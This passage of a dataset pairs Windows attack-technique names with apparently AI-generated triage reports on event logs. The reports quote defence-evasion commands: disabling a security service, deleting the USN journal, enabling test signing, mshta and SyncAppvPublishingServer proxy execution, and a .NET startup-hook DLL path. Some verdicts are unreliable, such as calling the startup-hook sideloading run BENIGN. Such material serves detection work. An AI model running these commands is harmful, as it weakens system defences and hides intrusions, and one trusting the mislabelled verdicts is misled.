       reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"" /t REG_SZ /d C:\Windows\System32\notepad.exe /f
       ```
   - The existence of these registry modification commands indicates potential unauthorized attempts to alter system configurations. This can signify malware behavior, as it may be attempting to redirect the execution of `msedge.exe` to a benign application (`notepad.exe`).

2. **Security Log Analysis:**
   - Anomalous events indicate privilege escalation with admin privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), which are configured during the logon session of `admin_test`. This suggests that this user session might have been compromised, or it could be an insider threat exploiting elevated privileges.
   - The presence of NTLM logon from a different workstation (`DESKTOP-3HL5B2P`) might indicate lateral movement or remote access by a malicious actor. The IP address `192.168.0.102` connecting using NTLM authentication could be a vector for further investigation.

3. **Application Log Analysis:**
   - Edge Update service activities seem typical but coincide with the unexpected change to `msedge.exe` paths, warranting further scrutiny for potential exploitation or unauthorized modifications.

**Assessment and Resolution:**
Given the combination of process executions indicating potential registry hijacking and the security events showing possible unauthorized privilege usage and lateral movements, these logs display strong indicators of malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host, `Server002`, to prevent any further malicious activity or lateral movement within the network.
- Perform a thorough forensic investigation of the host, focusing on the user profile `admin_test` and associated processes.
- Review logs and configurations on `DESKTOP-3HL5B2P` and track any other systems potentially accessed from the identified IP address.
- Examine other hosts on the network for similar registry alterations or unusual behavior.
- Reset credentials and enforce stringent policies on privileged accounts.
- Monitor for any further similar events across the network and adjust detection rules accordingly."
Modify EnableBDEWithNoTPM Registry entry,"### Detailed Analysis of Logs:

**Application Log:**
- The event from the ""Software Protection Platform Service"" with EventID 16384 appears benign. It seems to be a routine check or update related to software protection.
- An event related to ""edgeupdate"" indicates that a service stopped, which is a common occurrence as services stop and start regularly during updates. There is no indication of failure or error, suggesting benign activity.

**System Log:**
- Time change events shown by the ""Microsoft-Windows-Kernel-General"" are typical and may occur during synchronization with time servers or corrections. These actions are carried out by svchost.exe, a standard Windows service host process. The use of ""time.windows.com"" as the time source further confirms benign activity.
- There are no signs of unauthorized time changes or activities in these logs.

**Sysmon Log:**
- The execution of processes like MicrosoftEdgeUpdate.exe, wevtutil.exe, conhost.exe, whoami.exe, cmd.exe, and reg.exe mostly originate from ""SERVER002\admin_test"" or ""NT AUTHORITY\SYSTEM"". These accounts, especially when running with high integrity levels, are often used in administrative or system-related processes.
- The edge update processes are likely part of an update cycle, which is normal behavior.
- The command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f` executed by cmd.exe signifies a configuration change related to BitLocker. While it is worth investigating whether this is an expected change, it does not categorically indicate malicious activity.

**Security Log:**
- The time change events in the security log align with system events, corroborating that time updates were carried out by SYSTEM accounts through svchost.exe.
- There are no unauthorized or unexpected account modifications or logins.

### Assessment:

The observed events are consistent with typical system and service operations on a Windows server. Processes are being executed by legitimate system and administrative accounts under routine conditions such as updates or system configurations. The minor registry change related to BitLocker settings does not inherently suggest malicious intent without additional context (for example, an organization-specific policy change).

### Conclusion:
**Resolution: BENIGN**

Given the provided logs, there are no clear indicators of compromise or malicious activity. The system logs, application logs, sysmon events, and security logs do not show unusual process executions, privilege escalations, or suspicious command-line arguments that would warrant categorizing this activity as anything other than routine behavior. However, it is advisable to verify if the BitLocker setting change was made as part of an approved operation."
Code Signing Policy Modification,"### Detailed Analysis:

**System Logs:**

1. **Time Change Events (Event ID 1):**
   - The events indicate a change in system time executed by `svchost.exe`. Time changes in system logs can sometimes be indicative of attempts to bypass security settings such as timestamps on logs. However, it seems to follow normal operations with no malicious intention indicated.

**Sysmon Logs:**

2. **Process Creation Observations:**
   - Several instances of `wevtutil.exe` and `conhost.exe` were found running by the user `SERVER002\\admin_test`. `Wevtutil.exe` is a legitimate utility used for managing event logs, and `conhost.exe` is a console application. While they are legitimate applications, seeing multiple instances of `wevtutil.exe` may warrant further investigation into what commands were executed.
  
3. **Command Execution:**
   - A particularly notable instance is the execution of `cmd.exe` with the command line argument `bcdedit /set testsigning on`. This command enables test signing mode, which can allow unsigned drivers to be loaded. This is a risky command and, if executed without authorization, could suggest malicious activity.

**Application Logs:**

4. **Edge Update Service:**
   - Various `MicrosoftEdgeUpdate` processes appear in logs. The logs denote normal service operation with start and stop events. As Edge updates frequently, these entries suggest usual behavior unless linked with anomalies.

**Security Logs:**

5. **Time Change Logs (Event ID 4616):**
   - Similar to the System logs, these indicate system time changes by a service running under the `LOCAL SERVICE` account, which usually suggests legitimate activity.

### Assessment, Threats, and Guidance:

- The continuous instances of `wevtutil.exe` do not show direct signs of tampering or log deletion, but due to the frequency, further inspection of commands executed by these processes is recommended.
- The specific command to enable test signing mode (`bcdedit /set testsigning on`) stands out as potentially harmful due to the security implications of allowing unsigned software. This action should be logged and verified with the administrator for justification.
- The overall behavior of `/svc`, `/ping`, `/update`, and `/regsvc` commands related to `MicrosoftEdgeUpdate` processes do not show signs of exploitation, appearing as normal update installations.
 
### Resolution:

- **SUSPICIOUS**: While no direct evidence of malicious activity is found, the execution of the `bcdedit` command to enable test signing mode and repeated instances of `wevtutil.exe` suggest irregular activities that require further investigation. It is advised to verify the legitimacy of these actions by confirming with system and network administrators, and reviewing any recent changes or updates initiated by users."
Indicator Removal using FSUtil,"The log entries provided have been analyzed, and certain activities stand out as potential indicators of malicious behavior. A detailed analysis is as follows:

### Analysis

1. **Sysmon Logs**:
    - **Unusual Command Execution**: Multiple instances of `cmd.exe` running `fsutil usn deletejournal /D C:` were noted. The usage of `fsutil` to delete the USN (Change Journal) is suspicious as this is commonly done to hide tracks of file operations on the system. This could indicate attempts to cover up activities or changes made by an intruder.

2. **Security Logs**:
    - **Frequent Privileged Operations**: There are multiple Event ID 4672 which denotes that special privileges were assigned to a new logon, and 4624 logon events. While high-privileged logons are not inherently suspicious, the frequency and context (correlation with suspicious command executions) raise some red flags.

3. **Application Logs**:
    - **Volume Change Journal Deletion**: Specifically, the `Microsoft-Windows-Search` event (ID: 3079) logs the deletion of the volume change journal which aligns with the activities noted in the Sysmon logs about `fsutil`.

4. **Lack of Usual Process Details**:
    - Although there are commands executed such as `whoami.exe` and `hostname.exe`, they appear to be normal. Still, when combined with other activities, they can be considered enumeration steps during compromise or after privilege escalation.

### Conclusion

Based on the analysis of these logs, there are clear signs of potentially harmful activity:
- The deletion of USN journaling is noteworthy and indicative of potential malicious behavior aimed at hiding unauthorized actions on the filesystem.
- The frequent execution of commands with administrative privileges without clear benign justification.

### Resolution

The activities identified in these logs can confidently be concluded as **MALICIOUS**. The combination of filesystem journal deletion and seemingly unauthorized privileged command execution indicates a potential compromise. Immediate actions should include:
- Isolating the affected system from the network.
- Conducting a deeper forensic analysis to understand the extent of the compromise.
- Reviewing user and service account activity for any unauthorized actions or changes.
- Implementing improved logging and monitoring to detect such activities in the future.

Additionally, consider reviewing security policies and rights given to users to prevent privilege misuse."
Disable Remote Desktop Security Settings Through Registry,"### Analysis of Windows Event Logs:

#### Observations:
1. **Time Synchronization Events (EventID: 4616, 24, 1):**
   - Multiple log entries indicate a change in system time, possibly indicative of time tampering. Logs show small discrepancies in system time being adjusted by processes (`svchost.exe`) running under `LOCAL SERVICE`.
   - **Significance:** Frequent and small changes to system time could be attempts to obscure logged activities. Legitimate time changes may happen due to synchronization with a time server, but any tampering could be cause for concern if not attributable to legitimate processes.

2. **Privileged Logons and Privilege Escalations (EventID: 4624, 4672):**
   - User `admin_test` logs in with a high integrity level and inherits several high-permission tokens (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.).
   - **Significance:** While the account `admin_test` might be legitimate, the privileges acquired are highly sensitive. It is important to verify whether the logons authorized these privileges intentionally.

3. **Execution of Potentially Malicious Commands (Sysmon EventID: 1, 5):**
   - Observed `cmd.exe` executing a command to modify the Windows registry to potentially disable remote security settings:
     - Command: `reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableSecuritySettings"" /t REG_DWORD /d 1 /f`
   - **Significance:** Executing registry changes without explicit need or documentation could indicate an attempt to weaken security, especially if this setting is changed unexpectedly.

4. **Unusual Use of Utilities (Sysmon EventID: 1, 5):**
   - Frequent usage of `wevtutil.exe` and `conhost.exe` by `admin_test`:
     - While these utilities can be used for legitimate administrative purposes (e.g., clearing event logs, managing console sessions), repeated and unexplained use may signal attempts to cover tracks or conduct illicit operations.

#### Assessment:
- There is a combination of log events showing privilege escalation, potential time tampering, execution of suspect commands to alter system security settings, and unusual utility usage.
- While some activities might be part of regular administrative duties, the context and combination of these events lean towards an abusive or unauthorized pattern of behavior.

#### Recommendation:
- **Resolution: SUSPICIOUS**
  - The identified activities warrant further investigation. It is crucial to:
    - Verify the legitimacy of the `admin_test` account and whether these actions align with expected admin activities.
    - Confirm if the time changes were authorized and check against known IT maintenance windows.
    - Investigate the origin and need for registry modifications concerning security settings.
    - Conduct a thorough review of recent changes or patterns in administrative activities on the host.

By conducting detailed follow-ups on the points mentioned, the risk of potential compromise will be mitigated, and the root cause of any malicious activity can be identified."
WINWORD Remote Template Injection,"Upon reviewing the provided logs, here's a detailed analysis:

### Analysis:

1. **Application Log:**
   - The entry is from the `Microsoft-Windows-Security-SPP` indicating normal activity related to software protection. No suspicious activity noted here.

2. **Security Log:**
   - Events `4616` are related to system time changes with `svchost.exe` and under the `LOCAL SERVICE` user account. Adjustments to system time do not inherently indicate malicious activity but are noteworthy. However, no explicit cause for concern from these entries alone.

3. **Sysmon Log:**
   - There are several instances of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\\admin_test`. The repeated execution of `wevtutil.exe` could indicate log querying or clearance activity. 
   - Entries for `cmd.exe` launching with relatively benign command lines (`cmd.exe` operations and `whoami.exe`), executed under `SERVER002\\admin_test`. 
   - There is an entry showing `cmd.exe` with a command to open a `.docx` file: 
     ```plaintext
     ""cmd.exe"" /c start ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\Calculator.docx""
     ```
     Files opened via the command prompt, especially those in temp directories, can raise suspicion if they involve script execution or atypical files for command-line use.
   - There is no explicit indication of malware known to use such tools in the logs, however, the number of administrative command line tools being used consecutively suggests a need for further investigation into the user's activities.

4. **System Log:**
   - Logs under `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` reflect routine operations like time sync and system operations, not indicating anomalies by themselves.

### Conclusion:

The logs suggest potential for misuse or malicious intent, especially due to the repetitive execution of command line tools and temp directory file access. However, there is no definitive evidence of malicious activity. The behavior observed could potentially be admin tasks but given the context, it's unusual enough to warrant further scrutiny.

**Resolution: SUSPICIOUS**

### Recommendations:

- **Conduct Further Investigation:**
  - Review USER SERVER002\\admin_test recent activities, specifically targeting purpose and authorization concerning the command line usage and files accessed.
  - Look deeper into why `wevtutil.exe` was executed multiple times.
  - Confirm if a justified business need exists for the opening of `Calculator.docx` through the command line in the temporary directory.
  
- **Enhance Monitoring:**
  - Increase scrutiny of the particular user's activities and introduce alerts for any further execution of administrative tools without clear justification.

- **Review and Audit Permissions:**
  - Verify access permissions for `SERVER002\\admin_test` and remove any unnecessary elevated privileges.

By implementing these steps, a clearer picture of whether the activity was benign or indicative of a compromise can be formed."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"Analyzing the provided logs for potential indicators of anomalous or malicious activity involves inspecting unusual process executions, privilege escalations, and any suspicious command-line arguments.

**Application Logs Analysis:**
1. **Windows Defender Activation:**
   - Logged twice, indicating it is active. This is standard behavior.

2. **Edge Update Service Stopped:**
   - Logged twice. Stopping a service might warrant investigation if unexpected, but EdgeUpdate stopping isn't inherently suspicious and could be due to an update or termination after completing its task.

**Security Logs Analysis:**
1. **Event ID 4624 (Logon):**
   - A successful logon by the SYSTEM account (`TargetUserName`: SYSTEM). Logon type 5 indicates a service start, typical for SYSTEM account actions.

2. **Event ID 4672 (Special Privileges Assigned to New Logon):**
   - SYSTEM account with multiple privileges such as SeDebugPrivilege. This is common for SYSTEM accounts.

3. **Event ID 5379 (Credential Validation):**
   - Multiple entries present errors with a return code `3221226021` (STATUS_NO_SUCH_LOGON_SESSION), indicating failed credential validations. This could be harmless system operations where credentials or sessions are not present or required.

4. **Event ID 4798 (User Account Enumerated):**
   - Users like `Administrator` and others were enumerated by the `taskhostw.exe` process, running under the SYSTEM account. This enumeration could be routine administrative checks.

**Sysmon Logs Analysis:**
1. **Whoami and Hostname Executions:**
   - These utilities were executed under `admin_test`. Though benign, repeated execution might warrant further attention if coupled with other suspicious activities.

2. **Cmd.exe Execution with Suspicious Command Line:**
   - `cmd.exe` was run with a command containing `SyncAppvPublishingServer.vbs` and `Start-Process calc`. This seems like an attempt to run a calculator indirectly, which could indicate a test or probing activity.

3. **Edge Update Executions:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` were recorded. Primarily running under SYSTEM account, its activity aligns with software updates and is usually not a red flag unless details suggest something untoward (e.g., unsigned binaries or incorrect paths).

**System Logs Analysis:**
1. **Windows Update Events:**
   - Successful installation of security intelligence updates for Microsoft Defender Antivirus. Routine update processes reflect good security practice.

**Detailed Assessment:**
- **Cmd.exe Execution Risk:** The specific execution `cmd.exe /c C:\\windows\\system32\\SyncAppvPublishingServer.vbs \""\\n;Start-Process calc\""` stands out due to its nature of execution, seemingly attempting to obfuscate the execution of the calculator application, which might indicate testing or exploitation attempts.
- **Failed Credential Validation:** Multiple occurrences could suggest probing for accounts or testing system responses under certain conditions.

**Conclusion:**
Based on the reviewed logs, the activity can be categorized as:
- **SUSPICIOUS:** While most logs display acceptable behavior for a server executing updates and security checks, the use of `cmd.exe` to launch a process such as `calc` using unconventional scripts without clear context raises suspicion and warrants further investigation.

**Guidance:**
- Investigate the context of the `cmd.exe` execution by checking historical activity for the `admin_test` account.
- Verify whether `SyncAppvPublishingServer.vbs` is part of any known operations or scripts on the system.
- Assess why multiple credential validation attempts resulted in status errors, though they might be benign, continuing occurrences could indicate other issues.
- Confirm the origin and legitimacy of all `MicrosoftEdgeUpdate.exe` executions, ensuring updates are genuine."
Disable Windows Notification Center,"### Detailed Log Analysis

#### Sysmon Logs

1. **Process Executions:**
   - Multiple processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `cmd.exe` are executed under the user account `SERVER002\admin_test`.
   - The command `cmd.exe /c reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f` is executed. This command modifies the Windows Registry to disable the Notification Center, which is indicative of an alteration in system settings that may not be typical for regular user activity.

2. **Microsoft Edge Updates:**
   - Many instances of `MicrosoftEdgeUpdate.exe` under `NT AUTHORITY\SYSTEM` indicate the update process for Microsoft Edge. Processes related to updating software are common but should be observed in case of new or unexpected behavior.
   
3. **System Processes:**
   - Processes like `svchost.exe`, `sppsvc.exe`, `WmiPrvSE.exe`, and `TrustedInstaller.exe` are recorded, and they operate under system accounts indicating legitimate Windows services.
   
#### System Logs

1. **Time Change:**
   - There are entries indicating the system time was changed by the `svchost.exe` process. This could be benign if associated with time synchronization services such as W32Time.

#### Application Logs

1. **Service Logs:**
   - Logs from the `edgeupdate` service indicate service stops without any preceding error logs. This might be due to scheduled updates or expected stops post-update/installation events.

#### Security Logs

1. **Time Change Events:**
   - Security event logs also show time change events that match those seen in System Logs. These are flagged but do not immediately suggest malicious intent without associated triggering context.

### Assessment of Anomalous or Suspicious Behaviors

1. **Registry Modification via Command Line:**
   - The use of a command (`cmd.exe`) to modify the registry raises concerns as this can be a technique used in malware behavior or post-exploitation activities to suppress system notifications potentially on infected systems.

2. **Frequent and Unexplained Process Initiations:**
   - While generic processes such as `conhost.exe` are frequently seen, their synchronization with registry changes may hint at potential misuse. Tracking the specific user activity and aligning timeline events can be crucial.

### Conclusion

- **Resolution:** **SUSPICIOUS**

Based on the reviewed logs, the execution of a command to modify a registry key associated with system notifications stands as suspicious activity. Though it is not conclusively malicious, it does warrant further investigation to rule out the potential for abuse, especially if not initiated by a known scheduled maintenance or administrator-sanctioned task.

### Guidance on Next Steps

- Conduct further reviews focusing on the context around the registry modification command to validate user intent.
- Assess whether the `admin_test` account actions correlate with expected administrative actions or scheduled tasks.
- Implement monitoring for any further unauthorized registry changes or process anomalies, potentially expanding this to include PowerShell logs if available for unobtrusive script executions.
- Verify if any scheduled updates on Microsoft Edge coincide with observed Edge Update services for completeness."
UACME Bypass Method 59,"Based on the analysis of the provided Windows event logs, here are the key observations:

1. **Suspicious Process Execution:**
   - The Sysmon logs reveal the execution of the file `Akagi64.exe`, which seems to originate from a temporary user space directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\59 Akagi64.exe`). The usage of temporary directories for executing scripts or executables is commonly associated with malicious activity.
   - The executable `Akagi64.exe` was launched through `cmd.exe` and involved the PowerShell process as a parent process, which is noted for its capability in file-less attacks and administrative tasks.
   - The presence of `wsmprovhost.exe` as a parent process for various command executions, such as `whoami.exe` and `cmd.exe`, is unusual. `wsmprovhost.exe` is typically used for remote management tasks and could indicate a misuse for malicious purposes.

2. **Windows Defender State:**
   - The Application logs state that Windows Defender is ""SECURITY_PRODUCT_STATE_ON"", which indicates that security software is actively running, which should theoretically mitigate threats. However, it does not guarantee a system is free of malware, especially if advanced threats are involved.

3. **Multiple Edge Update Executions:**
   - There are numerous entries related to Microsoft Edge Update processes executing with different command parameters (e.g., `/svc`, `/update`, `/register`). While this is generally normal behavior for updates, excessive executions over a short period might indicate abuse of the update mechanism for persistence or privilege escalation.

4. **System Level Processes:**
   - Several processes like `EdgeUpdate` are executed under the `NT AUTHORITY\SYSTEM` account, which has the highest privileges on a Windows system. The command lines for these processes do not exhibit immediate signs of malice but need to be cross-referenced with known benign Edge update activities.

**Assessment and Guidance:**

- **Threat Potential:** The activity surrounding `Akagi64.exe` is particularly concerning and indicative of possible malicious activity, potentially linked to a common post-exploitation tool for privilege escalation.
  
- **Overall Resolution: SUSPICIOUS**
  - Though not definitively malicious without further context, the usage of temporary directories for `Akagi64.exe` execution, coupled with unusual usage patterns for legitimate Windows processes, raises suspicion.

**Next Steps:**

1. **Immediate Containment:**
   - Isolate the affected host from the network to prevent potential lateral movement and data exfiltration.

2. **Detailed Forensic Analysis:**
   - Investigate the origin and the content of the `Akagi64.exe` file and the associated script files.
   - Review PowerShell logs (if available) for further insights on commands executed.

3. **Threat Hunting:**
   - Conduct a broad-based review of similar indicators across the environment.
   - Evaluate other endpoints for unusual patterns of privileged process execution.

4. **Mitigation and Hardening:**
   - Reinforce endpoint security measures and ensure all software is patched and up-to-date.
   - Strengthen monitoring and alerting policies for activities similar to those identified in this analysis. 

Given the presence of these suspicious activities, it is crucial to escalate this investigation to verify the extent of any compromise and mitigate any potential threats."
"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","### Detailed Analysis of Logs:

#### 1. **Windows PowerShell Log Analysis:**

- **Key Observations:**
  - Logs indicate the execution of a PowerShell script that performs a series of actions involving the download, installation, copying, and execution of the KeyScrambler software. This includes:
      - Downloading a setup executable from `https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe`.
      - Silent installation of the KeyScrambler software.

  - Potential DLL hijacking or unauthorized code execution through manipulated components of the KeyScrambler software.
  - Installation of security software via PowerShell without user awareness or confirmation may be considered suspicious in contexts where administrative oversight is not stringent.

### Guidance on How to Proceed:

- **Resolution: SUSPICIOUS**
  - The activities present indicators of potential security risk and warrant further investigation to ensure KeyScrambler’s installation and use are within standard operating procedures and have not been tampered with.
  - Recommend vetting KeyScrambler as well as confirming with the user/intended installer whether these operations were deliberate and authorized.
  - Conduct a thorough endpoint security assessment evaluating DLL integrity, PowerShell command history, and potential lateral movement from this system."
Mshta executes VBScript to execute malicious command,"After thorough analysis of the provided Windows event logs, I have identified several elements of the activity recorded that are of concern and suggest potential malicious activity. Here is the detailed assessment of the situation:

### Indicators of Potential Malicious Activity:

1. **Unusual Command Execution via `mshta.exe` and `cmd.exe`:**
   - The use of `mshta.exe` to run VBScript to execute a PowerShell script `powershell.ps1` located in a temporary directory is suspicious and a technique often used in living off the land attacks (LOLBAS). The command:
     ```
     mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\powershell.ps1"""":close"")
     ```
   - This indicates an attempt to execute potentially harmful scripts on the machine, possibly establishing persistence or further compromising the system.

2. **Executed Processes with High Integrity Level:**
   - Multiple processes, particularly `cmd.exe`, `mshta.exe`, and `powershell.exe`, were executed with a high integrity level by the user `SERVER002\admin_test`. These processes were started nearly simultaneously, potentially indicating a coordinated execution attempt.

3. **Execution Context and User Privileges:**
   - The user `admin_test` has been observed logging in with NTLM authentication and executing commands with high privileges (as indicated by elevated tokens and a session with several powerful privileges such as SeDebugPrivilege, SeBackupPrivilege etc.).

4. **Suspicious and Non-standard Use of Built-in Windows Utilities:**
   - There are frequent launches of `C:\Windows\System32\HOSTNAME.EXE` and `C:\Windows\System32\whoami.exe`. While these might be typical utilities, combined with the suspicious process chain of `cmd.exe` -> `mshta.exe` -> `powershell.exe`, it could suggest usage for information gathering.
   
5. **Event Log Tampering Attempts:**
   - Frequent usage of `wevtutil.exe`, which is capable of tampering with event logs, aligns with efforts to cover tracks in a system post-exploitation scenario.

### Assessment:

Based on the observed behavior captured in the logs, including unusual and coordinated use of Microsoft HTML Application Host (mshta), highly privileged executions, and the characteristics of the commands involved, there is substantial evidence pointing towards malicious activity. This activity contains elements commonly associated with persistence and privilege escalation tactics seen in malware infections or unauthorized access scenarios.

### Resolution:

- **MALICIOUS**: The logs provide strong evidence of malicious activities that suggest unauthorized and potentially harmful scripts being executed on the machine with elevated privileges.

### Guidance on Next Steps:

- **Immediate Isolation:** Isolate the affected host (Server002) from the network to prevent potential lateral movement or further compromise.
- **Thorough Investigation and Forensics:** Conduct a deeper forensic analysis on the host, focusing on the executed PowerShell script, any network connections made during these events, and recovered files.
- **Review Network Traffic:** Analyze network connections and traffic patterns for anomalies that may indicate data exfiltration or additional compromised hosts.
- **Containment and Remediation:** Based on findings, remove any malicious files, scripts, or executables found on the host and reset all access credentials for the user `admin_test`.
- **Update Security Controls:** Enhance intrusion detection and prevention systems to recognize and block similar attack patterns in the future.
- **User Education and Policy Enforcement:** Provide security training to educate users about secure practices and enforce policies for least privilege usage to prevent privilege escalation attempts.

This evaluation should be documented and escalated to the incident response team for more coordinated response and recovery actions."
Disable Arbitrary Security Windows Service,"Based on the provided logs, we will perform an analysis to identify any suspicious or potentially malicious activity that could indicate a security incident on the Windows machine.

### Analysis:

**1. Process Execution:**
   - We observe multiple instances of `wevtutil.exe` and `conhost.exe` being executed in quick succession, typically a standard Windows event log utility and console host executable, respectively. However, the user associated with these processes is the local admin `SERVER002\\admin_test`, which could be a regular user activity for log management, but requires correlation with other unusual behavior.

**2. Critical Command Execution:**
   - A command was executed using `cmd.exe` with the command-line: `\""cmd.exe\"" /c net.exe stop McAfeeDLPAgentService & sc.exe config McAfeeDLPAgentService start= disabled`. This action stops the McAfee DLP agent service and disables it from starting. This could potentially disable critical security controls, indicating suspicious behavior aimed at evading detection.

**3. Integrity Level and Hash Analysis:**
   - The commands and processes executed are at a High Integrity Level, implying elevated privileges were used. Hash values are provided but do not match any known malicious hashes based on current threat intelligence, though the specific action against McAfee DLP is concerning.

**4. User Activity and Logon:**
   - The activity appears to be concentrated around the user `SERVER002\\admin_test`, who is executing processes with elevated privileges. This user's actions should be scrutinized, and any unauthorized or unexpected activity verified, especially surrounding the critical services and system utilities.

**5. System and Security Logs:**
   - Modifications to time (`EventID: 4616` in Security logs) were noted, but these align with routine operations, as seen from time synchronization events. There appears to be no direct indication from Security logs of privilege escalation attempts outside downloadable process trees.

**6. Application Logs:**
   - The logs indicate periodic service stop messages related to `edgeupdate`. No immediate security threat emanating from this specific application was detected, likely regular updates.

### Assessment:
After performing an in-depth review of the logs, the most significant finding is the action taken against the McAfeeDLPAgentService, which could be an attempt at disabling security features to perform further malicious activities without detection. 

The remaining activities, such as the use of `wevtutil.exe`, `conhost.exe`, and `svchost.exe`, do not necessarily point to explicitly malicious actions but must be contextualized with the larger pattern of behavior, especially considering the elevated privilege use.

### Resolution:
- **SUSPICIOUS**: The logs contain activity that appears suspicious - particularly the disabling of the McAfee DLP service. While not definitively malicious based on current evidence, this behavior is anomalous enough to warrant further investigation.
  
### Guidance:
- Conduct a detailed security review of the user `SERVER002\\admin_test` and their actions on the system.
- Validate if disabling McAfee DLP was authorized; if unauthorized, escalate as a potential security breach.
- Consider monitoring or additional logging to catch any further attempts to disable security services.
- Perform a network-wide review for similar activities to assess if this is an isolated incident or part of a larger threat campaign."
LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"Upon analyzing the provided Windows event logs, here is a detailed assessment of the activities:

### System Logs:
1. **Kernel-General (Event ID 24 & 1)**: These logs indicate regular system time change activities performed by the `svchost.exe` process. Time synchronization activities are standard on Windows systems, and the process involved (`svchost.exe`) is a legitimate Windows process running under the `LOCAL SERVICE` account.

2. **Windows-Time-Service (Event ID 35)**: Indicates time synchronization with a time source (`time.windows.com`), with no indications of suspicious activity.

### Application Logs:
1. **EdgeUpdate**: The entries show the stopping of 'edgeupdate' services which might be part of regular automatic updates management. There is no direct indication of malicious activity from these logs alone.

2. **Software Protection Platform Service (Event ID 16384)**: Regular log entry related to the Software Protection Platform recording an operation at a specified time. This entry does not suggest malicious behavior.

### Windows PowerShell Logs:
1. **Registry Modification (Event ID 600)**: Powershell commands were executed to modify the registry, specifically altering Windows Defender Operational log channel settings (disabling with value `0`), which can be indicative of attempts to tamper with security logs. This set of actions raises suspicion as it might attempt to cover tracks of malicious activities.

### Sysmon Logs:
1. **Sysmon Process Created (Event ID 1 & 5)**: The process execution tracked by Sysmon suggests several executions of legitimate Windows utilities like `wevtutil.exe`, `hostname.exe`, and processes related to `Microsoft Edge Update`. While the processes themselves are legitimate, their usage in non-conventional ways can signal reconnaissance or system exploration activities. The multiple calls to `wevtutil.exe`, a tool for managing events and logs, are suspicious.

2. **EdgeUpdate Executions**: Frequent and rapid sequences of Microsoft Edge update processes being spawned are observed. While updates can be normal, the chaining and the volume may suggest automatic update activity or misuse of legitimate processes.

### Security Logs:
1. **Security-Auditing (Event ID 4616)**: Indicates system time changes. These can tie back to the System log activities for time synchronization, appearing reasonable given synchronization tasks but could also correlate with attempts to manipulate log timelines.

### Assessment:
- **Suspicious Activity Identified**: The PowerShell logs modifying registry keys, linked with the creation and execution patterns noticed in the Sysmon logs regarding logging utilities such as `wevtutil.exe`, and changes related to EdgeUpdate processes raise significant red flags. The intention to modify event logging settings and multiple instances of system utilities being executed could signal an attempt at hiding traces or exploring the system’s configuration.

### Conclusion: 
**SUSPICIOUS** - Based on the analysis, these logs contain activities that are potentially indicative of reconnaissance or attempts to bypass security features. Further investigation is warranted to determine if these anomalies result from misconfigurations, legitimate administrative activities, or malicious intent. Possible steps include conducting forensic investigations, verifying the integrity of critical system and security configuration files, monitoring for further anomalous behavior, and reviewing user access logs."
DLL Side-Loading using the dotnet startup hook environment variable,"Based on the provided Windows logs, let's thoroughly analyze the events to determine any potential malicious activities or anomalies.

### Key Observations:

1. **Microsoft Edge Update Activity:**
   - Numerous entries in the logs are related to the Microsoft Edge Update, such as `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe`.
   - The processes are executed under `NT AUTHORITY\SYSTEM`, which is expected for system-level updates.
   - The activities appear to involve the regular updating of Microsoft Edge components and exhibit expected behavior for a legitimate update process, including operations with the expected Company Name and File Versions.

2. **Usage of PowerShell and Other System Utilities:**
   - A PowerShell process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) executed by the `SERVER002\admin_test` user.
   - Usage of `host.exe`, `whoami.exe`, and `cmd.exe` is observed. These are legitimate Windows utilities often used for various administrative tasks and scripting.
   - The command `cmd.exe /c set DOTNET_STARTUP_HOOKS=""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\preloader.dll""` is noted. This could potentially be benign, however, setting environment variables related to .NET startup hooks in a temporary directory might deserve scrutiny depending on the context of legitimate use.

3. **Unusual Command Lines:**
   - Command lines, such as for `wermgr.exe` with `-upload` flag and `cmd.exe` with environment variable changes, might indicate anomaly depending on the organization's standard operations and configurations.
   - Command lines involving `EdgeUpdate.exe` also present various switches for update and installation, typical for genuine software updates.

4. **Processes by 'SERVER002\\admin_test':**
   - Multiple process creations involving tools like `wevtutil.exe`, `conhost.exe` by `SERVER002\\admin_test` user, which might suggest either a maintenance activity or perhaps script automation/administrative tasks.

### Assessment:

Given the detailed analysis of the log entries, the activities appear consistent with legitimate software maintenance functions and routine administrative actions based on the information provided. The Microsoft Edge Update entries correspond to a legitimate software process. Whilst there might be some potentially unusual operations from the user `SERVER002\\admin_test`, such as environmental set operations in a temp directory, these are not distinctly malicious without further context such as abnormal traffic, unauthorized access logs, or similar red flags.

### Resolution:

- **BENIGN**: The logs reveal activities attributed to legitimate software updates and administrative tasks. While some command lines and operations by the user should be reviewed as part of routine checks, no clearly malicious activities are identified in the current dataset.

### Guidance:

- **Routine Monitoring:** Continue routine monitoring to capture any emerging threats or anomalies, focusing on privileged accounts and system-related process executions.
- **Confirm with Context:** Double-check with actual Edge update schedules and administrator activities to validate the circumstances of the `cmd.exe` and PowerShell operations.
- **Security Policy Review:** Ensure security policies are up-to-date, with restricted script actions and PowerShell activities to avoid misuse under admin accounts."
